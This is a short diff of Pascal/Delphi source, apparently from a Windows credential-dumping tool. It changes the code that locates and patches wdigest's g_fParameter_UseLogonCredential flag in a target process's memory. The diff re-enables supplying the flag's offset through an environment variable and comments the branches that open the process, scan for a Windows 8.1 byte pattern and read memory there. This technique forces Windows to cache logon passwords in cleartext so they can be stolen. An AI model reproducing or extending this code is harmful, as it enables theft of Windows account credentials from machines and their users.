@@ -916,14 +916,13 @@ result:=false;
         end;
      end; //if (lowercase(osarch)='amd64') then
 
-  {
+
   if lowercase(getenv('g_fParameter_UseLogonCredential'))<>'' then
      begin
      patch_pos:=-1;
      offset:=int64(strtoint('$'+getenv('g_fParameter_UseLogonCredential')));
      log('env g_fParameter_UseLogonCredential:'+inttohex(offset,sizeof(offset)));
      end;
-  }
 
   if patch_pos =0 then
      begin
@@ -949,7 +948,7 @@ result:=false;
     begin
     log('openprocess ok',0);
 
-    if patch_pos =-1 then
+    if patch_pos =-1 then //relative offset was provided
         begin
         log('g_fParameter_UseLogonCredential offset:'+inttohex(offset,sizeof(pointer)));
         //we now should get a match with dd wdigest!g_fParameter_UseLogonCredential
@@ -961,7 +960,7 @@ result:=false;
         result:=true;
         end;
 
-    if patch_pos <>-1 then
+    if patch_pos <>-1 then  //some more work to find the relative offset
     if ReadMem  (hprocess,offset+sizeof(PTRN_WIN81_UseLogonCredential),@offset_dword,4) then
         begin
         //CopyMemory(@offset_dword,@offset_byte[0],4);
